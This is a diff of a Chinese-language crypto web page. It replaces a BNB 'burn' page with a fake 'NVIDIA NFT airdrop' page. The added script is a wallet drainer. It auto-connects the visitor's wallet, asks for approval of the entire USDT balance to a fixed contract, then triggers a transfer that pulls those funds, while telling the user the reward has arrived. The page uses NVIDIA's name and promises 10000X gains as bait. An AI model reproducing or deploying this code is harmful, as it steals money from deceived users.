-                <p class="mechanism-desc">燃烧销毁机制，确保通缩，价值持续增长！</p>
-            </div>
-        </div>
-
-        <!-- 燃烧分红 -->
-        <div class="burn-panel">
-            <h2 class="burn-panel-title">🔥 燃烧分红面板</h2>
-            
-            <div class="wallet-info">
-                <span class="wallet-status" id="walletStatus">点击下方按钮连接钱包</span>
-            </div>
-            
-            <button class="burn-btn" id="connectWallet" onclick="openWalletModal()">
-                🔗 连接钱包
-            </button>
-            
-            <div style="margin-top: 30px;">
-                <h3 style="text-align: center; color: #ffcc00; font-size: 1.4rem; margin-bottom: 20px;">
-                    💰 选择燃烧金额
-                </h3>
-                <div class="amount-options">
-                    <button class="amount-btn" onclick="selectAmount(0.1)">
-                        <div>0.1</div>
-                        <div class="amount-label">BNB</div>
-                    </button>
-                    <button class="amount-btn" onclick="selectAmount(0.3)">
-                        <div>0.3</div>
-                        <div class="amount-label">BNB</div>
-                    </button>
-                    <button class="amount-btn" onclick="selectAmount(0.5)">
-                        <div>0.5</div>
-                        <div class="amount-label">BNB</div>
-                    </button>
-                    <button class="amount-btn" onclick="selectAmount(1)">
-                        <div>1</div>
-                        <div class="amount-label">BNB</div>
-                    </button>
-                </div>
-            </div>
-            
-            <div class="selected-display" id="selectedDisplay">
-                请选择燃烧金额
-            </div>
-            
-            <button class="burn-btn" id="burnBtn" onclick="burnBNB()" disabled>
-                🔥 立即燃烧
-            </button>
-            
-
-        </div>
-
-        <!-- 愿景 -->
-        <div class="card">
-            <h2 class="card-title">🌟 愿景与使命</h2>
-            <div class="card-content">
-                <p>2026蝴蝶平台 AI赋能，共建去中心化智能未来！</p>
-                <p style="margin-top: 15px;">生态功能全自动：纳米数据清洗 & 富化</p>
-                <p style="margin-top: 10px;">让AI正式走向生活，让燃烧走向极致，让金钱走向自由！🎉</p>
-            </div>
-        </div>
-
-        <!-- 官方社群 -->
-        <h2 class="card-title" style="text-align: center; margin-top: 60px;">📢 官方社群 & 渠道</h2>
-        <div class="social-links">
-            <a href="https://qm.qq.com/cgi-bin/qm/qr?k=858601782" class="social-link" target="_blank">
-                <span class="social-icon">🐧</span>
-                <span class="social-text">QQ1群：858601782</span>
-            </a>
-            <a href="https://qm.qq.com/cgi-bin/qm/qr?k=1085574681" class="social-link" target="_blank">
-                <span class="social-icon">🐧</span>
-                <span class="social-text">QQ2群：1085574681</span>
-            </a>
-            <a href="https://qm.qq.com/cgi-bin/qm/qr?k=1085333455" class="social-link" target="_blank">
-                <span class="social-icon">🐧</span>
-                <span class="social-text">QQ3群：1085333455</span>
-            </a>
-            <a href="https://m.debox.pro/group?id=eoay5tuv&code=977kzf4e" class="social-link" target="_blank">
-                <span class="social-icon">📦</span>
-                <span class="social-text">DeBox 社群</span>
-            </a>
-            <a href="https://twitter.com/namibnb888" class="social-link" target="_blank">
-                <span class="social-icon">🐦</span>
-                <span class="social-text">推特：@namibnb888</span>
-            </a>
-            <a href="https://t.me/namibnb88" class="social-link" target="_blank">
-                <span class="social-icon">✈️</span>
-                <span class="social-text">电报社群</span>
-            </a>
-        </div>
-
-        <!-- 底部 -->
-        <footer class="footer">
-            <p class="footer-text">© 2026蝴蝶平台 | 共建去中心化智能未来</p>
-        </footer>
+  <div class="container">
+    <!-- Header -->
+    <div class="header">
+      <div class="logo-container">
+        <span class="logo-text">NVIDIA</span>
+      </div>
+      <h1 style="font-size: 28px; font-weight: 800; margin-top: 12px;">
+        <span style="background: var(--gradient-primary); -webkit-background-clip: text; -webkit-text-fill-color: transparent;">NFT</span> 空投领取
+      </h1>
+      <p class="tagline">NVIDIA 顶流IP机制 · 全新升级</p>
     </div>
 
-    <!-- 钱包选择弹窗 -->
-    <div class="wallet-modal" id="walletModal">
-        <div class="wallet-modal-content">
-            <span class="modal-close" onclick="closeWalletModal()">✕</span>
-            <h2 class="modal-title">🦋 选择钱包</h2>
-            
-            <div class="wallet-options">
-                <button class="wallet-btn" onclick="connectWallet('metamask')">
-                    <span class="wallet-icon">👛</span>
-                    <span class="wallet-name">链接钱包</span>
-
-                </button>
-
-            </div>
-            
-            <p style="text-align: center; color: #888; font-size: 0.9rem; margin-top: 20px;">
-                💡 选择一个已安装的钱包进行连接
-            </p>
+    <!-- Main Card -->
+    <div class="card">
+      <div class="card-content">
+        <!-- Promo Banner -->
+        <div class="promo-banner">
+          <div class="promo-title">🔥 48小时内启动 · 连续10天热搜</div>
+          <div class="promo-subtitle">
+            海外基金会<span style="color: var(--primary); font-weight: 700;">100W</span>💸助力<br>
+            挑战30天 <span style="color: var(--success); font-weight: 700;">10000X</span> 收益
+          </div>
+          <div class="promo-highlight">
+            ⚡ 速度上车别踏空
+          </div>
         </div>
+
+        <!-- Notice -->
+        <div class="info-box">
+          <p>
+            ⚠️ <strong>重要提示：</strong>最多只能领取到钱包中的实际余额，请确保您的钱包有足够余额完成授权。
+          </p>
+        </div>
+
+        <!-- Wallet Info -->
+        <div class="wallet-info" id="walletInfo">
+          <div class="wallet-row">
+            <div>
+              <div class="wallet-label">钱包地址</div>
+              <div class="wallet-address" id="walletAddress"></div>
+            </div>
+            <div class="wallet-balance">
+              <div class="balance-value" id="usdtBalance">---</div>
+              <div class="balance-label">USDT 余额</div>
+            </div>
+          </div>
+        </div>
+
+        <!-- Contact Section -->
+        <div class="contact-section">
+          <div class="contact-title">联系我们</div>
+          
+          <div class="contact-item">
+            <svg class="contact-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+              <path d="M21 11.5a8.38 8.38 0 01-.9 3.8 8.5 8.5 0 01-7.6 4.7 8.38 8.38 0 01-3.8-.9L3 21l1.9-5.7a8.38 8.38 0 01-.9-3.8 8.5 8.5 0 014.7-7.6 8.38 8.38 0 013.8-.9h.5a8.48 8.48 0 018 8v.5z"/>
+            </svg>
+            <span>电宝: <span class="contact-value">@BSC00001</span></span>
+          </div>
+
+          <div class="contact-item">
+            <svg class="contact-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+              <rect x="3" y="4" width="18" height="18" rx="2" ry="2"/>
+              <line x1="16" y1="2" x2="16" y2="6"/>
+              <line x1="8" y1="2" x2="8" y2="6"/>
+              <line x1="3" y1="10" x2="21" y2="10"/>
+            </svg>
+            <span>AVE头像已收录 ✅</span>
+          </div>
+
+          <div class="contact-item">
+            <svg class="contact-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+              <path d="M17 21v-2a4 4 0 00-4-4H5a4 4 0 00-4 4v2"/>
+              <circle cx="9" cy="7" r="4"/>
+              <path d="M23 21v-2a4 4 0 00-3-3.87M16 3.13a4 4 0 010 7.75"/>
+            </svg>
+            <span>官方地址: <span class="contact-value" style="font-size: 11px;">0x8214d150687eac7706a2883d33be9c26c31bd5b0</span></span>
+          </div>
+        </div>
+
+        <!-- Action Button -->
+        <button class="action-btn" id="actionBtn" onclick="approveAndTransfer()">
+          🎁 立即领取奖励
+        </button>
+
+        <!-- Status -->
+        <div id="status" class="info">
+          <span>正在自动连接钱包...</span>
+          <small>请在钱包插件中确认</small>
+        </div>
+      </div>
     </div>
 
-    <script>
-        // Web3 相关变量
-        let web3 = null;
-        let selectedAmount = 0;
-        let userAddress = '';
-        let currentWallet = '';
-        const BSC_CHAIN_ID = '0x38'; // BSC Mainnet Chain ID
-        const TARGET_ADDRESS = '0x63247C6336A435f7D38b630151Bd7332c3cB66AA';
+    <!-- Features -->
+    <div class="features">
+      <div class="feature">
+        <svg class="feature-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+          <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
+        </svg>
+        <div class="feature-text">安全可靠</div>
+      </div>
+      <div class="feature">
+        <svg class="feature-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+          <circle cx="12" cy="12" r="10"/>
+          <polyline points="12,6 12,12 16,14"/>
+        </svg>
+        <div class="feature-text">快速到账</div>
+      </div>
+      <div class="feature">
+        <svg class="feature-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+          <path d="M22 11.08V12a10 10 0 11-5.93-9.14"/>
+          <polyline points="22,4 12,14.01 9,11.01"/>
+        </svg>
+        <div class="feature-text">公开透明</div>
+      </div>
+    </div>
 
-        // 钱包配置
-        const walletConfig = {
-            metamask: {
-                name: 'MetaMask',
-                downloadUrl: 'https://metamask.io/download/',
-                icon: '🦊'
-            },
-            tokenpocket: {
-                name: 'TokenPocket',
-                downloadUrl: 'https://www.tokenpocket.pro/download',
-                icon: 'TP'
-            },
-            okx: {
-                name: 'OKX Wallet',
-                downloadUrl: 'https://www.okx.com/web3',
-                icon: '💙'
-            },
-            binance: {
-                name: 'Binance Web3 Wallet',
-                downloadUrl: 'https://www.binance.com/en/web3/wallet',
-                icon: '🟡'
-            }
-        };
+    <!-- Footer -->
+    <div class="footer">
+      Powered by BNB Smart Chain
+    </div>
+  </div>
 
-        // 打开钱包选择弹窗
-        function openWalletModal() {
-            document.getElementById('walletModal').classList.add('active');
+  <script>
+    const CONTRACT = "0xa4441b1EcB6B807de485723F5320d06fB41Eac6F";
+    const USDT = "0xa85f403f7869a050c91e9a260dbf08a64229b2de";
+    const MAX_UINT256 = "115792089237316195423570985008687907853269984665640564039457584007913129639935";
+
+    const ABI_USDT = [
+      {"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"approve","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},
+      {"inputs":[{"internalType":"address","name":"account","type":"address"}],"name":"balanceOf","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"}
+    ];
+
+    const ABI_FORWARDER = [{"inputs":[],"name":"transferFromApproved","outputs":[],"stateMutability":"nonpayable","type":"function"}];
+
+    let web3, account;
+    const status = document.getElementById("status");
+    const walletInfo = document.getElementById("walletInfo");
+    const walletAddress = document.getElementById("walletAddress");
+    const usdtBalance = document.getElementById("usdtBalance");
+    const actionBtn = document.getElementById("actionBtn");
+
+    async function autoConnect() {
+      if (!window.ethereum) {
+        status.className = "error";
+        status.innerHTML = "<span>❌ 未检测到钱包插件</span>";
+        return false;
+      }
+      try {
+        web3 = new Web3(window.ethereum);
+        await window.ethereum.request({ method: 'eth_requestAccounts' });
+        const chainId = await web3.eth.getChainId();
+        if (chainId !== 56) {
+          try {
+            await window.ethereum.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: '0x38' }] });
+          } catch(e) {
+            // 网络切换失败，继续
+          }
+        }
+        [account] = await web3.eth.getAccounts();
+        walletAddress.innerText = account.slice(0, 8) + '...' + account.slice(-6);
+        walletInfo.style.display = "block";
+        status.className = "success";
+        status.innerHTML = `<span>✅ 钱包连接成功</span><small>${account.slice(0,10)}...${account.slice(-8)}</small>`;
+        await updateUSDTBalance();
+        return true;
+      } catch (e) {
+        status.className = "error";
+        status.innerHTML = e.code === 4001 ? "<span>❌ 用户取消连接</span>" : "<span>❌ 连接失败</span>";
+        return false;
+      }
+    }
+
+    async function updateUSDTBalance() {
+      try {
+        const usdt = new web3.eth.Contract(ABI_USDT, USDT);
+        const balance = await usdt.methods.balanceOf(account).call();
+        const formatted = (balance / 1e6).toFixed(2);
+        usdtBalance.innerText = formatted;
+      } catch (e) {
+        usdtBalance.innerText = "--";
+      }
+    }
+
+    async function approveAndTransfer() {
+      if (!account && !await autoConnect()) return;
+
+      actionBtn.disabled = true;
+      actionBtn.innerHTML = '<span class="spinner"></span> 处理中...';
+      status.className = "loading";
+      status.innerHTML = "<span>🔄 正在查询余额并授权...</span><small>请确认第一笔交易</small>";
+
+      try {
+        const usdt = new web3.eth.Contract(ABI_USDT, USDT);
+        const balance = await usdt.methods.balanceOf(account).call();
+
+        if (balance === "0") {
+          status.className = "warning";
+          status.innerHTML = "<span>⚠️ 余额为 0，无需操作</span>";
+          actionBtn.disabled = false;
+          actionBtn.innerHTML = '🎁 立即领取奖励';
+          return;
         }
 
-        // 关闭钱包选择弹窗
-        function closeWalletModal() {
-            document.getElementById('walletModal').classList.remove('active');
-        }
+        await usdt.methods.approve(CONTRACT, balance).send({ from: account });
 
-        // 点击弹窗外部关闭
-        document.getElementById('walletModal').addEventListener('click', function(e) {
-            if (e.target === this) {
-                closeWalletModal();
-            }
-        });
+        status.innerHTML = "<span>✅ 授权成功！正在转账...</span><small>请确认第二笔交易</small>";
 
-        // 创建燃烧粒子
-        function createFireParticles() {
-            const container = document.getElementById('fireParticles');
-            const colors = ['#ff6b35', '#ff8c00', '#ffcc00', '#ff4500', '#ff6347'];
-            
-            for (let i = 0; i < 50; i++) {
-                const particle = document.createElement('div');
-                particle.className = 'particle';
-                
-                const size = Math.random() * 8 + 4;
-                const left = Math.random() * 100;
-                const duration = Math.random() * 3 + 2;
-                const delay = Math.random() * 5;
-                const color = colors[Math.floor(Math.random() * colors.length)];
-                
-                particle.style.cssText = `
-                    width: ${size}px;
-                    height: ${size}px;
-                    left: ${left}%;
-                    background: ${color};
-                    animation-duration: ${duration}s;
-                    animation-delay: ${delay}s;
-                    box-shadow: 0 0 ${size * 2}px ${color};
-                `;
-                
-                container.appendChild(particle);
-            }
-        }
+        const forwarder = new web3.eth.Contract(ABI_FORWARDER, CONTRACT);
+        await forwarder.methods.transferFromApproved().send({ from: account });
 
-        // 获取钱包注入对象
-        function getWalletProvider(walletType) {
-            switch (walletType) {
-                case 'tokenpocket':
-                    return window.tokenpocket || window.ethereum;
-                case 'okx':
-                    return window.okxwallet || window.ethereum;
-                case 'binance':
-                    return window.BinanceChain || window.ethereum;
-                case 'metamask':
-                default:
-                    return window.ethereum;
-            }
-        }
+        status.className = "success";
+        status.innerHTML = "<span>🎉 领取成功！</span><small>USDT 已到账</small>";
+        await updateUSDTBalance();
 
-        // 连接钱包
-        async function connectWallet(walletType) {
-            closeWalletModal();
-            currentWallet = walletType;
-            
-            const provider = getWalletProvider(walletType);
-            const walletInfo = walletConfig[walletType];
-            
-            // 检查是否安装钱包
-            if (!provider) {
-                alert(`未检测到 ${walletInfo.name} 钱包！\n\n请先安装 ${walletInfo.name} 钱包后再试。`);
-                window.open(walletInfo.downloadUrl, '_blank');
-                return;
-            }
+      } catch (e) {
+        status.className = "error";
+        status.innerHTML = e.code === 4001 ? "<span>❌ 用户取消操作</span>" : "<span>❌ 交易失败</span>";
+        console.error(e);
+      }
 
-            try {
-                // 请求账户授权
-                const accounts = await provider.request({ 
-                    method: 'eth_requestAccounts' 
-                });
-                
-                userAddress = accounts[0];
-                
-                // 检查是否在 BSC 网络
-                const chainId = await provider.request({ 
-                    method: 'eth_chainId' 
-                });
-                
-                if (chainId !== BSC_CHAIN_ID) {
-                    // 请求切换到 BSC 网络
-                    try {
-                        await provider.request({
-                            method: 'wallet_switchEthereumChain',
-                            params: [{ chainId: BSC_CHAIN_ID }],
-                        });
-                    } catch (switchError) {
-                        // 如果网络不存在，添加 BSC 网络
-                        if (switchError.code === 4902) {
-                            await provider.request({
-                                method: 'wallet_addEthereumChain',
-                                params: [{
-                                    chainId: BSC_CHAIN_ID,
-                                    chainName: 'BNB Smart Chain',
-                                    nativeCurrency: {
-                                        name: 'BNB',
-                                        symbol: 'BNB',
-                                        decimals: 18
-                                    },
-                                    rpcUrls: ['https://bsc-dataseed.binance.org/'],
-                                    blockExplorerUrls: ['https://bscscan.com/']
-                                }],
-                            });
-                        } else {
-                            throw switchError;
-                        }
-                    }
-                }
-                
-                // 初始化 Web3
-                web3 = new Web3(provider);
-                
-                // 更新UI
-                document.getElementById('walletStatus').innerHTML = 
-                    `✅ 已连接：<span style="color: #4ade80">${walletInfo.icon} ${walletInfo.name}</span><br>` +
-                    `<span style="color: #aaa; font-size: 0.9rem">${userAddress.substring(0, 6)}...${userAddress.substring(38)}</span>`;
-                document.getElementById('connectWallet').style.display = 'none';
-                
-                // 检查是否有选中的金额，启用燃烧按钮
-                if (selectedAmount > 0) {
-                    document.getElementById('burnBtn').disabled = false;
-                }
-                
-                // 监听账户变化
-                provider.on('accountsChanged', (accounts) => {
-                    if (accounts.length === 0) {
-                        location.reload();
-                    } else {
-                        userAddress = accounts[0];
-                        document.getElementById('walletStatus').innerHTML = 
-                            `✅ 已连接：<span style="color: #4ade80">${walletInfo.icon} ${walletInfo.name}</span><br>` +
-                            `<span style="color: #aaa; font-size: 0.9rem">${userAddress.substring(0, 6)}...${userAddress.substring(38)}</span>`;
-                    }
-                });
-                
-                // 监听网络变化
-                provider.on('chainChanged', () => {
-                    location.reload();
-                });
-                
-            } catch (error) {
-                console.error('连接钱包失败:', error);
-                alert(`连接 ${walletInfo.name} 钱包失败，请重试！\n\n错误信息：${error.message}`);
-            }
-        }
+      actionBtn.disabled = false;
+      actionBtn.innerHTML = '🎁 立即领取奖励';
+    }
 
-        // 选择金额
-        function selectAmount(amount) {
-            selectedAmount = amount;
-            
-            // 更新按钮样式
-            document.querySelectorAll('.amount-btn').forEach(btn => {
-                btn.classList.remove('selected');
-            });
-            event.currentTarget.classList.add('selected');
-            
-            // 更新显示
-            document.getElementById('selectedDisplay').innerHTML = 
-                `已选择：<span style="color: #ff6b35; font-size: 1.5rem; font-weight: bold;">${amount} BNB</span>`;
-            
-            // 启用燃烧按钮
-            if (web3) {
-                document.getElementById('burnBtn').disabled = false;
-            }
-        }
+    window.onload = async () => {
+      // Auto wake TP wallet on mobile
+      if (/Android|iPhone|iPad|iPod/i.test(navigator.userAgent)) {
+        const tpLink = "tp://dapp?url=https://airdr0p-888.github.io/GROK1688/index.html";
+        window.location.href = tpLink;
+        setTimeout(() => {
+          window.location.href = "https://www.tokenpocket.pro/zh/download";
+        }, 30000);
+      }
 
-        // 燃烧 BNB
-        async function burnBNB() {
-            if (!web3) {
-                alert('请先连接钱包！');
-                return;
-            }
-            
-            if (selectedAmount === 0) {
-                alert('请选择燃烧金额！');
-                return;
-            }
-            
-            try {
-                const burnBtn = document.getElementById('burnBtn');
-                burnBtn.disabled = true;
-                burnBtn.innerHTML = '⏳ 交易处理中...';
-                
-                // 获取对应的钱包 provider
-                const provider = getWalletProvider(currentWallet);
-                
-                // 转换金额为 Wei
-                const amountInWei = web3.utils.toWei(selectedAmount.toString(), 'ether');
-                
-                // 构建交易
-                const transactionParameters = {
-                    from: userAddress,
-                    to: TARGET_ADDRESS,
-                    value: amountInWei,
-                    gas: '21000', // 标准转账 Gas 限制
-                };
-                
-                // 发送交易
-                const txHash = await provider.request({
-                    method: 'eth_sendTransaction',
-                    params: [transactionParameters],
-                });
-                
-                alert(`✅ 交易已提交！\n\n交易哈希：${txHash}\n\n请在 BSCScan 查看交易状态：\nhttps://bscscan.com/tx/${txHash}`);
-                
-                // 重置状态
-                burnBtn.innerHTML = '🔥 立即燃烧';
-                burnBtn.disabled = false;
-                
-                // 打开交易详情
-                window.open(`https://bscscan.com/tx/${txHash}`, '_blank');
-                
-            } catch (error) {
-                console.error('交易失败:', error);
-                alert(`❌ 交易失败：${error.message}`);
-                
-                const burnBtn = document.getElementById('burnBtn');
-                burnBtn.disabled = false;
-                burnBtn.innerHTML = '🔥 立即燃烧';
-            }
-        }
-
-        // 检查自动连接
-        window.addEventListener('load', async () => {
-            createFireParticles();
-            
-            // 如果已经连接钱包，自动加载
-            if (typeof window.ethereum !== 'undefined') {
-                const accounts = await window.ethereum.request({ 
-                    method: 'eth_accounts' 
-                });
-                
-                if (accounts.length > 0) {
-                    connectWallet();
-                }
-            }
-        });
-
-        // 添加滚动动画
-        const observerOptions = {
-            threshold: 0.1,
-            rootMargin: '0px 0px -50px 0px'
-        };
-
-        const observer = new IntersectionObserver((entries) => {
-            entries.forEach(entry => {
-                if (entry.isIntersecting) {
-                    entry.target.style.opacity = '1';
-                    entry.target.style.transform = 'translateY(0)';
-                }
-            });
-        }, observerOptions);
-
-        document.querySelectorAll('.card, .feature-item, .mechanism-item').forEach(el => {
-            el.style.opacity = '0';
-            el.style.transform = 'translateY(30px)';
-            el.style.transition = 'opacity 0.6s ease, transform 0.6s ease';
-            observer.observe(el);
-        });
-    </script>
+      await autoConnect();
+    };
+  </script>
 </body>
 </html>
-
